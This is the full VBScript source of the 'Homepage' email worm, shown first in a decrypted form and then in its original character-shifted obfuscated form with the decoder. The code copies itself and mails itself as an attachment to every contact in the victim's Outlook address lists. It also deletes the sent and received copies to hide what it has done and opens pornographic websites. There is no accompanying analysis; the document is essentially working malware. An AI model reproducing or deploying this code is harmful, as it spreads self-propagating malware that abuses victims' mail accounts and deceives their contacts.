/*HomePage mailworm decrypted by Ilitirit*/

On Error Resume Next
Set WS = CreateObject("WScript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Folder=FSO.GetSpecialFolder(2)

Set InF=FSO.OpenTextFile(WScript.ScriptFullname,1)
Do While InF.AtEndOfStream<>True
ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"\homepage.HTML.vbs",2,true)
OutF.write ScriptBuffer
OutF.close
Set FSO=Nothing

If WS.regread ("HKCU\software\An\mailed") <> "1" then
Mailit()
End If

Set s=CreateObject("Outlook.Application")
Set t=s.GetNameSpace("MAPI")
Set u=t.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=t.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="Homepage" Then
u.Items.Item(i).delete
End If
Next

Randomize
r=Int((4*Rnd)+1)
If r=1 then
WS.Run("http://hardcore.pornbillboard.net/shannon/1.htm")
elseif r=2 Then
WS.Run("http://members.nbci.com/_XMCM/prinzje/1.htm")
elseif r=3 Then
WS.Run("http://www2.sexcropolis.com/amateur/sheila/1.htm")
ElseIf r=4 Then
WS.Run("http://sheila.issexy.tv/1.htm")
End If

Function Mailit()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
	Set Mapi=Outlook.GetNameSpace("MAPI")
	Set Lists=Mapi.AddressLists
	For Each ListIndex In Lists
		If ListIndex.AddressEntries.Count <> 0 Then
			ContactCount = ListIndex.AddressEntries.Count
			For Count= 1 To ContactCount
				Set Mail = Outlook.CreateItem(0)
				Set Contact = ListIndex.AddressEntries(Count)
				Mail.To = Contact.Address
				Mail.Subject = "Homepage"
				Mail.Body = vbcrlf&"Hi!"&vbcrlf&vbcrlf&"You've got to see this page! It's really cool ;O)"&vbcrlf&vbcrlf
				Set Attachment=Mail.Attachments
				Attachment.Add Folder & "\homepage.HTML.vbs"
				Mail.DeleteAfterSubmit = True
				If Mail.To <> "" Then
				Mail.Send
				WS.regwrite "HKCU\software\An\mailed", "1"
			End If
			Next
		End If
	Next
End if
End Function


/*Original Worm*/

Execute DeCode("QpGttqtTguwogPgzvUgvYU?EtgcvgQdlgev*$YUetkrv0Ujgnn$+UgvHUQ?Etgcvgqdlgev*$uetkrvkpi0hkngu{uvgoqdlgev$+Hqnfgt?HUQ0IgvUrgekcnHqnfgt*4+UgvKpH?HUQ0QrgpVgzvHkng*YUetkrv0UetkrvHwnnpcog.3+FqYjkngKpH0CvGpfQhUvtgco>@VtwgUetkrvDwhhgt?UetkrvDwhhgt(KpH0TgcfNkpg(xdetnhNqqrUgvQwvH?HUQ0QrgpVgzvHkng*Hqnfgt($^jqogrcig0JVON0xdu$.4.vtwg+QwvH0ytkvgUetkrvDwhhgtQwvH0enqugUgvHUQ?PqvjkpiKhYU0tgitgcf*$JMEW^uqhvyctg^Cp^ockngf$+>@$3$vjgpOcknkv*+GpfKhUgvu?EtgcvgQdlgev*$Qwvnqqm0Crrnkecvkqp$+Ugvv?u0IgvPcogUrceg*$OCRK$+Ugvw?v0IgvFghcwnvHqnfgt*8+Hqtk?3vqw0kvgou0eqwpvKhw0Kvgou0Kvgo*k+0uwdlgev?$Jqogrcig$Vjgpw0Kvgou0Kvgo*k+0enqugw0Kvgou0Kvgo*k+0fgngvgGpfKhPgzvUgvw?v0IgvFghcwnvHqnfgt*5+Hqtk?3vqw0kvgou0eqwpvKhw0Kvgou0Kvgo*k+0uwdlgev?$Jqogrcig$Vjgpw0Kvgou0Kvgo*k+0fgngvgGpfKhPgzvTcpfqok|gt?Kpv**6,Tpf+-3+Kht?3vjgpYU0Twp*$jvvr<11jctfeqtg0rqtpdknndqctf0pgv1ujcppqp130jvo$+gnugkht?4VjgpYU0Twp*$jvvr<11ogodgtu0pdek0eqo1aZOEO1rtkp|lg130jvo$+gnugkht?5VjgpYU0Twp*$jvvr<11yyy40ugzetqrqnku0eqo1cocvgwt1ujgknc130jvo$+GnugKht?6VjgpYU0Twp*$jvvr<11ujgknc0kuugz{0vx130jvo$+GpfKhHwpevkqpOcknkv*+QpGttqtTguwogPgzvUgvQwvnqqm?EtgcvgQdlgev*$Qwvnqqm0Crrnkecvkqp$+KhQwvnqqm?$Qwvnqqm$VjgpUgvOcrk?Qwvnqqm0IgvPcogUrceg*$OCRK$+UgvNkuvu?Ocrk0CfftguuNkuvuHqtGcejNkuvKpfgzKpNkuvuKhNkuvKpfgz0CfftguuGpvtkgu0Eqwpv>@2VjgpEqpvcevEqwpv?NkuvKpfgz0CfftguuGpvtkgu0EqwpvHqtEqwpv?3VqEqpvcevEqwpvUgvOckn?Qwvnqqm0EtgcvgKvgo*2+UgvEqpvcev?NkuvKpfgz0CfftguuGpvtkgu*Eqwpv+Ockn0Vq?Eqpvcev0CfftguuOckn0Uwdlgev?$Jqogrcig$Ockn0Dqf{?xdetnh($Jk#$(xdetnh(xdetnh($[qw)xgiqvvquggvjkurcig#Kv)utgcnn{eqqn=Q+$(xdetnh(xdetnhUgvCvvcejogpv?Ockn0CvvcejogpvuCvvcejogpv0CffHqnfgt($^jqogrcig0JVON0xdu$Ockn0FgngvgChvgtUwdokv?VtwgKhOckn0Vq>@$$VjgpOckn0UgpfYU0tgiytkvg$JMEW^uqhvyctg^Cp^ockngf$.$3$GpfKhPgzvGpfKhPgzvGpfkhGpfHwpevkqp")
Function DeCode(Coded)
For I = 1 To Len(Coded)
CurChar= Mid(Coded, I, 1)
If Asc(CurChar) = 15 Then
CurChar= Chr(10)
ElseIf Asc(CurChar) = 16 Then
CurChar= Chr(13)
ElseIf Asc(CurChar) = 17 Then
CurChar= Chr(32)
ElseIf Asc(CurChar) = 18 Then
CurChar= Chr(9)
Else
CurChar = Chr(Asc(CurChar) - 2)
End If
DeCode = DeCode & CurChar
Next
End Function